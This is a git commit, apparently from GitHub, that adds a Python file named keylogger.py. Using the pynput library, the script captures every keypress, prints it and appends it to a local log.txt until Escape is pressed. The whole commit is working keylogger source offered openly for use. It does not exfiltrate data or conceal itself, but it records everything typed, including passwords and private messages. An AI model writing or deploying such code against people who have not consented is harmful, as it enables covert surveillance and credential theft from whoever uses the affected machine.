96984d0031b67fac06c690cf9fbf4afd7908dea9
kohlikadola <139218297+kohlikadola@users.noreply.github.com>
2023-07-11 15:16:05 +0530

    Add files via upload

---
+++ keylogger.py
@@ -0,0 +1,23 @@
+import pynput
+from pynput.keyboard import Key,Listener
+count =0
+keys=[]
+def on_press(key):
+    global keys,count
+    keys.append(key)
+    count+=1
+    print("{0} pressed".format(key))
+    if count>=1:
+        count=0
+        write_file(keys)
+        keys=[]
+def on_release(key):
+    if key ==Key.esc:
+        return False
+def write_file(keys):
+    with open("log.txt","a") as f:
+        for key in keys:
+            f.write(str(key))
+with Listener(on_press=on_press,on_release=on_release) as listener:
+
+    listener.join()
